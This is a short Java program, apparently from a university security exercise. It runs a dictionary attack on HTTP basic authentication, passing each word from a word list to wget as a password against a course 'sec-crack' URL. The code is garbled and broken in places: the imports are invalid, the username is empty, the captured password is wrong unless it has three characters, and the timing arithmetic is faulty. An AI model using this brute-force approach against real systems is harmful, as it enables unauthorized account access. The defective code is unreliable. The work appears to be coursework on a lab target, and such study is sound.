import java.Object;
import java.io.*;
import java.String;
import java.util.*;

class Dictionary{

      public static void main(String [] args){
              try
                {
                Date d = new Date();
                String line1="";
                String ps="";
                String file1 = "words.txt";
                String file2 = "index.html";
                String endline="Authorization failed.";
                String [] cmd = new String[4];
                cmd[0] = "wget";
                cmd[1] = "--http-user=";
                cmd[3] = "http://sec-crack.cs.rmit.edu./SEC/2/";

                FileReader fr1 = new FileReader(file1);
                BufferedReader in1 = new BufferedReader(fr1);
                while((line1 = in1.readLine())!=null)
                {
                  try{
                    cmd[2] = connect(line1);
                    Runtime.getRuntime().exec(cmd);
                    if(line1.length()==3)
                      ps = line1;
                    System.out.println(cmd[2]);
                    File f = new File(file2);
                    if(f.exists())
                    {
                    System.out.println("password: " + ps);
                    break;
                    }
                   }
                    catch(IOException ex)
                    {
                        System.out.println("hello1");
                    }

                }
                Date end = new Date();
                System.out.println(d.toString());
                System.out.println(end.toString());
                System.out.println("Seconds: " + (end.getSeconds()-d.getSeconds()));
               }

            catch(IOException e)
            {
              System.out.println("hello,didnt find file.");
            }
      }
    public static String connect(String str1)
            {
                 char data[] = {'-','-','h','t','t','p','-','p','a','s','s','w','d','='};
                 String str = new String(data);
                 return str + str1;
            }

}
